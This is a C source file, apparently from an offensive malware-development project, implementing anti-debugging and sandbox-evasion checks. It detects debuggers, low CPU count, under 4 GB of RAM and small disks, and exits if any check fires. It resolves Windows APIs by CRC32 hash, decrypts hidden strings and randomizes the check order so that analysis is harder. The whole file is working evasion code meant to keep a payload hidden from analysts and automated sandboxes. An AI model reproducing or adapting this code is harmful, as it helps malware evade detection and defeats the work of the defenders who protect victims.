//
// Created by 0xtriboulet on 4/9/2023.
//
#include "Asm.h"
#include "Dbg.h"
#include "Defs.h"
#include "Poly.h"
#include "Config.h"
#include "Strings.h"
#include "AntiDebug.h"
#include "Utilities.h"
#include "Obfuscation.h"

#include <tchar.h>

// Provides basic anti-debugging and anti-emulation techniques. Easily bypassable by analysis
// References:
//   Checkpoint:        https://anti-debug.checkpoint.com/
//   0xPat's blog here: https://0xpat.github.io/Malware_development_part_2/
//   Ultimate Debugging Reference

#if CONFIG_ANTI_DEBUG == TRUE
UCHAR s_xk[] = S_XK;
#endif

INT DecLoopCount(INT loopCount);
BOOL Checks();

BOOL IsDebugged(){
    if (Checks()){
        ExitProcess(EXIT_SUCCESS);
    }
    return FALSE;
}

BOOL Checks()
{
    INT LOOP_COUNT = RAND % 0x5;
    INT COUNT = 5;
    BOOL outBool = FALSE;

#if CONFIG_ANTI_DEBUG & CONFIG_OBFUSCATION
/*
 *  This implementation ensures the jump table is built differently at compile time
 */

    // TODO: REPLACE THIS GETTING KERNEL32 HANDLES WITH PEB WALKING
    UCHAR s_string[] = S_KERNEL32;
    UCHAR d_string[13] = {0};

    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, d_string, s_xk);

    // check debugger
    HANDLE p_kernel32 = LocalGetModuleHandle(d_string);
    IsDebuggerPresent_t p_IsDebuggerPresent= NULL;
    CheckRemoteDebuggerPresent_t p_CheckRemoteDebuggerPresent= NULL;

    // check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo_t p_GetSystemInfo = NULL;
    DWORD numberOfProcessors = 0;

    // check RAM
    MEMORYSTATUSEX memoryStatus;
    GlobalMemoryStatusEx_t p_GlobalMemoryStatusEx = NULL;
    DWORD RAMMB = 0x0;


    // check HDD
    CreateFileW_t p_CreateFileW = NULL;
    HANDLE hDevice = NULL;
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl_t p_DeviceIoControl = NULL;
    DWORD diskSizeGB;

    while(COUNT){
        switch(LOOP_COUNT){

            case 0:
                p_IsDebuggerPresent= (IsDebuggerPresent_t) GetProcAddressByHash(p_kernel32,IsDebuggerPresent_CRC32B);

                check_debug(p_IsDebuggerPresent!=NULL,"Finding p_IsDebuggerPresent Failed!");

                p_CheckRemoteDebuggerPresent= (CheckRemoteDebuggerPresent_t) GetProcAddressByHash(
                        p_kernel32, CheckRemoteDebuggerPresent_CRC32B);

                check_debug(p_CheckRemoteDebuggerPresent!=NULL,"Finding p_IsDebuggerPresent Failed!");

                check_debug(p_CheckRemoteDebuggerPresent(NtCurrentProcess, &outBool) != 0, "CheckRemoteDebuggerPresent Failed1");

                if (p_IsDebuggerPresent() || outBool) {return TRUE;}

                COUNT--;
                LOOP_COUNT = DecLoopCount(LOOP_COUNT);
                break;

            case 1:
                p_GetSystemInfo= (GetSystemInfo_t) GetProcAddressByHash(p_kernel32, GetSystemInfo_CRC32B);

                check_debug(p_GetSystemInfo!=NULL,"Finding p_GetSystemInfo Failed!");

                p_GetSystemInfo(&systemInfo);
                numberOfProcessors = systemInfo.dwNumberOfProcessors;
                if (numberOfProcessors < 4) {return TRUE;}

                COUNT--;
                LOOP_COUNT = DecLoopCount(LOOP_COUNT);
                break;

            case 2:
                memoryStatus.dwLength = sizeof(memoryStatus);
                p_GlobalMemoryStatusEx = (GlobalMemoryStatusEx_t) GetProcAddressByHash(p_kernel32,
                                                                                       GlobalMemoryStatusEx_CRC32B);

                check_debug(p_GlobalMemoryStatusEx!=NULL,"Finding p_GlobalMemoryStatusEx Failed!");

                check_debug(p_GlobalMemoryStatusEx(&memoryStatus) != 0,"Finding p_GlobalMemoryStatusEx Failed!");

                RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
                if (RAMMB < 4096) {return TRUE;}

                COUNT--;
                LOOP_COUNT = DecLoopCount(LOOP_COUNT);
                break;

            case 3:
                p_CreateFileW= (CreateFileW_t) GetProcAddressByHash(p_kernel32, CreateFileW_CRC32B);

                check_debug(p_CreateFileW!=NULL,"Finding p_CreateFileW Failed!");

                hDevice = p_CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

                check_debug(hDevice !=NULL,"CreateFileW Failed!");

                p_DeviceIoControl = (DeviceIoControl_t) GetProcAddressByHash(p_kernel32, DeviceIoControl_CRC32B);

                check_debug(p_DeviceIoControl!=NULL,"Finding DeviceIoControl Failed!");

                check_debug(p_DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL) != 0, "DeviceIoControl Failed!");
                diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
                if (diskSizeGB < 100){return TRUE;}

                COUNT--;
                LOOP_COUNT = DecLoopCount(LOOP_COUNT);
                break;

            case 4: // Reserved
                COUNT--;
                LOOP_COUNT = DecLoopCount(LOOP_COUNT);
                break;
        }

    }


#elif CONFIG_ANTI_DEBUG
    check_debug(CheckRemoteDebuggerPresent(NtCurrentProcess, &outBool)!= 0, "CheckRemoteDebuggerPresent Failed!");

    if (IsDebuggerPresent() || outBool) {
        return TRUE;
    }

    // check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 4) return TRUE;

    // check RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    check_debug(GlobalMemoryStatusEx(&memoryStatus) != 0, "GlobalMemoryStatusEx");

    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 4096) return TRUE;

    // check HDD
    HANDLE hDevice = NULL;
    hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    check_debug(hDevice!=NULL,"CreateFileW Failed!");

    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;

    check_debug(DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL) != 0, "DeviceIoControl Failed!");

    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return TRUE;


#endif // CONFIG_ANTI_DEBUG

    return outBool;

    LEAVE:
        return TRUE;
}

inline INT DecLoopCount(INT loopCount){
    INT newLoopCount = 0;

    if(loopCount <= 0){
        newLoopCount = 4;
    }else{
        newLoopCount = loopCount - 1;
    }
    return newLoopCount;
}